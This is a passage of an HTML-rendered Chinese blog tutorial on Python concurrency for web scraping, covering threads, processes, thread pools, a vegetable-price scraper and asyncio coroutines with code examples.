class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># def func():</span></span><br><span class="line"><span class="comment">#     for i in range(1000):</span></span><br><span class="line"><span class="comment">#         print(&quot;func&quot;, i)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 启动每一个程序默认都会有一个主线程</span></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="comment">#     func()</span></span><br><span class="line"><span class="comment">#     for i in range(1000):</span></span><br><span class="line"><span class="comment">#         print(&quot;main&quot;, i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;func&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = Thread(target=func)  <span class="comment"># 给线程安排任务,注意这里没括号</span></span><br><span class="line">    t.start()  <span class="comment"># 多线程状态可以开始为工作状态，具体的执行时间由CPU决定</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;main&quot;</span>, i)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074214.jpg"                      alt="image-20220917153356405"                ></p><p>​    注意上面是没有括号的，加括号是对函数执行结果的调用，不加括号是对函数的调用</p><p>​    另一种写法，覆写run方法，和java挺像这里，不懂的可以去看我的java文章</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># def func():</span></span><br><span class="line"><span class="comment">#     for i in range(1000):</span></span><br><span class="line"><span class="comment">#         print(&quot;func&quot;, i)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 启动每一个程序默认都会有一个主线程</span></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="comment">#     func()</span></span><br><span class="line"><span class="comment">#     for i in range(1000):</span></span><br><span class="line"><span class="comment">#         print(&quot;main&quot;, i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # 多线程</span></span><br><span class="line"><span class="comment"># from threading import Thread</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># def func():</span></span><br><span class="line"><span class="comment">#     for i in range(1000):</span></span><br><span class="line"><span class="comment">#         print(&quot;func&quot;, i)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># if __name__ == &#x27;__main__&#x27;:</span></span><br><span class="line"><span class="comment">#     t = Thread(target=func)  # 给线程安排任务,注意这里没括号</span></span><br><span class="line"><span class="comment">#     t.start()  # 多线程状态可以开始为工作状态，具体的执行时间由CPU决定</span></span><br><span class="line"><span class="comment">#     for i in range(1000):</span></span><br><span class="line"><span class="comment">#         print(&quot;main&quot;, i)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一种写法</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span>(<span class="title class_ inherited__">Thread</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;子线程&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = MyThread()</span><br><span class="line">    t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;主线程&quot;</span>, i)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74215.jpg"                      alt="image-20220917154229629"                ></p><h4 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h4><p>​    用的比较少，开进程消耗资源比较多</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;子进程&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Process(target=func)</span><br><span class="line">    p.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;主进程&quot;</span>, i)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074216.jpg"                      alt="image-20220917171218048"                ></p><p>​    那么有时候我们需要给函数传参数，可以这么实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="built_in">print</span>(name, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t1 = Thread(target=func, args=(<span class="string">&quot;周杰伦&quot;</span>,))  <span class="comment"># 必须是元组</span></span><br><span class="line">    t2 = Thread(target=func, args=(<span class="string">&quot;王⼒宏&quot;</span>,))</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074218.jpg"                      alt="image-20220917171708698"                ></p><h4 id="线程池和进程池"><a href="#线程池和进程池" class="headerlink" title="线程池和进程池"></a>线程池和进程池</h4><p>​    发现这⽹站的数据太多了. 有⼀万多⻚. 也就对应着 ⼀万多个url. 那我们设计多线程的时候如果每个url对应⼀个线程就 会产⽣新问题. 朋友, 你⼀定要知道. 创建线程本身也是要消耗你的计 算机资源的. 线程不是变魔术变出来的. 那这时我们就可以考虑能不 能重复的使⽤线程呢? 答案当然可以. 线程池就可以帮你搞定.</p><p>​    线程池⼯作原理: 创建⼀个⼤池⼦, 存放固定数量的线程. 然后把我们要执⾏的任务丢给线程池. 由线程池去分配哪个线程来完成该任务. 其他的事情都不需要管.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fn</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(name, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 创建线程池</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">50</span>) <span class="keyword">as</span> t:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            t.submit(fn, name=<span class="string">f&quot;线程<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment"># 等待线程池中的任务全部执行完毕，才继续执行（守护）</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;123&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="线程池案例-搞搞菜价"><a href="#线程池案例-搞搞菜价" class="headerlink" title="线程池案例_搞搞菜价"></a>线程池案例_搞搞菜价</h4><p>​    线程池一般思路：</p><p>​    1、如何提取单个页面的数据</p><p>​    2、上线程池，多个页面同时抓取</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074219.jpg"                      alt="image-20220919133926356"                ></p><p>​    这个效率非常低下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://www.xinfadi.com.cn/getPriceData.html&quot;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;user-agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) &quot;</span></span><br><span class="line">                  <span class="string">&quot;Chrome/104.0.0.0 Safari/537.36 &quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data.csv&quot;</span>, mode=<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">csvwriter = csv.writer(f)</span><br><span class="line"></span><br><span class="line">list1 = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_all_page</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">18157</span>):  <span class="comment"># 效率非常低下</span></span><br><span class="line">        data = <span class="string">f&quot;limit=20&amp;current=<span class="subst">&#123;i&#125;</span>&amp;pubDateStartTime=&amp;pubDateEndTime=&amp;prodPcatid=&amp;prodCatid=&amp;prodName=&quot;</span></span><br><span class="line">        resp = requests.post(url, data=data, headers=headers)</span><br><span class="line">        respdata = resp.json()[<span class="string">&quot;list&quot;</span>]</span><br><span class="line">        <span class="comment"># print(respdata)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">            onedata = respdata[i].items()</span><br><span class="line">            list1 = <span class="built_in">list</span>(onedata)</span><br><span class="line">            <span class="built_in">print</span>(list1)</span><br><span class="line">            csvwriter.writerow(list1)</span><br><span class="line">        <span class="built_in">print</span>(url + data, <span class="string">&quot;提取完毕!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    download_all_page(url)</span><br></pre></td></tr></table></figure><p>​    这里出现了一些小问题，知道思路好了，就不搞了，在改版前抓取的代码是这样的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="comment"># ⼲掉新发地</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">url</span>):</span><br><span class="line">resp = requests.get(url)</span><br><span class="line">html = etree.HTML(resp.text)</span><br><span class="line">table =html.xpath(<span class="string">&quot;/html/body/div[2]/div[4]/div[1]/table&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">trs = table.xpath(<span class="string">&quot;./tr[position()&gt;1]&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> tr <span class="keyword">in</span> trs:</span><br><span class="line"> tr_text = tr.xpath(<span class="string">&quot;./td/child::text()&quot;</span>)</span><br><span class="line"> tr_text = (item.replace(<span class="string">&quot;\\&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">for</span> item <span class="keyword">in</span> tr_text)</span><br><span class="line">csv_writer.writerow(tr_text)</span><br><span class="line"> <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> csv_writer = csv.writer(<span class="built_in">open</span>(<span class="string">&quot;菜价.csv&quot;</span>,mode=<span class="string">&quot;w&quot;</span>))</span><br><span class="line"> <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">50</span>) <span class="keyword">as</span> t:</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>): <span class="comment"># 别弄太狠. 不好</span></span><br><span class="line">url_temp = <span class="string">f&quot;http://www.xinfadi.com.cn/marketanalysis/0/list</span></span><br><span class="line"><span class="string">/<span class="subst">&#123;i&#125;</span>.shtml&quot;</span></span><br><span class="line"> t.submit(fn=download, url=url_temp)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;all down!&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h4><p>​    协程是我要重点去讲解的⼀个知识点. 它能够更加⾼效的利⽤CPU. </p><p>​    其实, 我们能够⾼效的利⽤多线程来完成爬⾍其实已经很6了. 但是, 从某种⻆度讲, 线程的执⾏效率真的就⽆敌了么? 我们真的充分的利⽤CPU资源了么? </p><p>​    ⾮也~ ⽐如, 我们来看下⾯这个例⼦. 我们单独的⽤⼀个线程来完成某⼀个操作. 看看它的效率是否真的能 把CPU完全利⽤起来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我爱黎明&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;我真的爱黎明&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    func()</span><br></pre></td></tr></table></figure><p>​    在该程序中, 我们的func()实际在执⾏的时候⾄少需要3秒的时间来完成操作. 中间的三秒钟需要让我当前的线程处于阻塞状态. 阻塞状态的线程 CPU是不会来执⾏你的. 那么此时cpu很可能会切换到其他程序上去执⾏. 此时, 对于你来说, CPU其实并没有为你 ⼯作(在这三秒内), 那么我们能不能通过某种⼿段, 让CPU⼀直为我⽽⼯作. 尽量的不要去管其他⼈. </p><p>​    我们要知道CPU⼀般抛开执⾏周期不谈, 如果⼀个线程遇到了IO操作, CPU就会⾃动的切换到其他线程进⾏执⾏. 那么, 如果我想办法让我的线程遇到了IO操作就挂起, 留下的都是运算操作. 那CPU是不是就会⻓时间的来照顾我. </p><p>​    以此为⽬的, 伟⼤的程序员就发明了⼀个新的执⾏过程. <strong>协程：当线程中遇到了IO操作的时候, 将线程中的任务进⾏切换, 切换成⾮ IO操作. 等原来的IO执⾏完了. 再恢复回原来的任务中.</strong></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-074221.jpg"                      alt="image-20220919155532043"                ></p><p>​    就形成了这样⼀种模型, 在程序遇到了IO操作(费时不费⼒的操作)时, ⾃动切换到其他任务. 该模型被称为协程. </p><p>​    协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作。在宏观上，我们能看到的其实是多个任务一起在执行，也就是一个多任务异步操作。不过<strong>这些所讲的一切都是在单线程条件下</strong>。</p><p>​        协程的基本写法: 咱就介绍⼀种, 也是最好⽤的⼀种, 如果各位想看更加详细, 细致的协程推导过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，</span></span><br><span class="line"><span class="comment"># 在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作</span></span><br><span class="line"><span class="comment"># 在宏观上，我们能看到的其实是多个任务一起在执行</span></span><br><span class="line"><span class="comment"># 多任务异步操作</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我叫赛利亚&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    g = func()  <span class="comment"># 此时的函数是异步协程函数，此时函数执行得到的是一个协程对象</span></span><br><span class="line">    <span class="comment"># print(g)</span></span><br><span class="line">    asyncio.run(g)  <span class="comment"># 协程程序运行霜要asyncio模块的支持</span></span><br></pre></td></tr></table></figure><p>​    此时是并不会比原来快的，我们重新建一个任务</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，</span></span><br><span class="line"><span class="comment"># 在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作</span></span><br><span class="line"><span class="comment"># 在宏观上，我们能看到的其实是多个任务一起在执行</span></span><br><span class="line"><span class="comment"># 多任务异步操作</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是mes9s0&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是mes9s0&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是王建国&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是王建国&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func3</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是李雪琴&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是李雪琴&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    f1 = func1()</span><br><span class="line">    f2 = func2()</span><br><span class="line">    f3 = func3()</span><br><span class="line">    tasks = [</span><br><span class="line">        f1, f2, f3</span><br><span class="line">    ]</span><br><span class="line">    t1 = time.time()  <span class="comment"># 记录时间</span></span><br><span class="line">    <span class="comment"># 一次启动多个任务(协程)</span></span><br><span class="line">    asyncio.run(asyncio.wait(tasks))</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    <span class="built_in">print</span>(t2 - t1)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://mes9s0hexo.oss-cn-hangzhou.aliyuncs.com/2023-04-15-74222.jpg"                      alt="image-20220919161037452"                ></p><p>​    这会疑问了，我们明明是异步操作，却还是9s多，这是因为当程序出现了同步操作的时候，异步就中断了。我们这么修改下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 协程：当程序遇见了I0操作的时候，可以选择性的切换到其他任务上，</span></span><br><span class="line"><span class="comment"># 在微观上是一个任务一个任务的进行切换．切换条件一般就是I0操作</span></span><br><span class="line"><span class="comment"># 在宏观上，我们能看到的其实是多个任务一起在执行</span></span><br><span class="line"><span class="comment"># 多任务异步操作</span></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是mes9s0&quot;</span>)</span><br><span class="line">    <span class="comment"># time.sleep(3)  # 当程序出现了同步操作的时候，异步就中断了</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">3</span>)  <span class="comment"># 异步操作的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是mes9s0&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是王建国&quot;</span>)</span><br><span class="line">    <span class="comment"># time.sleep(2)</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)  <span class="comment"># 异步操作的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是王建国&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func3</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是李雪琴&quot;</span>)</span><br><span class="line">    <span class="comment"># time.sleep(4)</span></span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">4</span>)  <span class="comment"># 异步操作的代码</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊，我是李雪琴&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    f1 = func1()</span><br><span class="line">    f2 = func2()</span><br><span class="line">    f3 = func3()</span><br><span class="line">    tasks = [</span><br><span class="line">        f1, f2, f3</span><br><span class="line">    ]</span><br><span class="line">    t1 = time.time()  <span class="comment"># 记录时间</span></span><br><span class="line">    <span class="comment"># 一次启动多个任务(协程)</span></span><br><span class="line">    asyncio.run(asyncio.wait(tasks))</span><br><span class="line">    t2 = time.time()</span><br><span class="line">    <span class="built_in">print</span>(t2 - t1)</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     